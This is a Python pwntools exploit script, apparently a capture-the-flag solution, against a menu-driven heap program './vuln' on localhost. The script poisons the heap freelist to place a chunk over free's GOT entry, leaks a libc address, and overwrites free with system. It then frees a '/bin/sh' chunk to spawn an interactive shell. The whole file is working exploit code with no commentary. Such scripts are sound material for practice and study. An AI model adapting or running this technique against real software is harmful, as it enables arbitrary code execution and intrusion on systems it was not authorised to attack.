#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")
HOST,PORT = 'localhost', 1337
context.arch = "amd64"

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process('./vuln')

def add(idx, size, data):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"size: ")
    io.sendline(f"{size}")
    io.recvuntil(b"idx: ")
    io.sendline(f"{idx}")
    io.recvuntil(b"message: ")
    io.send(data)

def edit(idx, data):
    io.recvuntil(b"> ")
    io.sendline(b"4")
    io.recvuntil(b"idx: ")
    io.sendline(f"{idx}")
    io.recvuntil(b"message: ")
    io.send(data)

def delete(idx):
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b"idx: ")
    io.sendline(f"{idx}")

def show(idx):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"idx: ")
    io.sendline(f"{idx}")
    io.recvuntil(f"[{idx}] ")
    return io.recvline().strip()

add(0, 128, b"A"*8)
add(1, 128, b"A"*8)
delete(0)
delete(1)
edit(1, p64(exe.got['free']-0x10))
add(2, 128, b"B"*8)
add(3, 128, b"C"*0x10)

free_libc = u64(show(3)[0x10:]+b"\x00\x00")
libc_base = free_libc - libc.symbols['free']
print(hex(free_libc))
print(hex(libc_base))
edit(3, b"C"*0x10+p64(libc_base + libc.symbols['system']))

add(4, 32, b'/bin/sh\x00')
delete(4)

io.interactive()
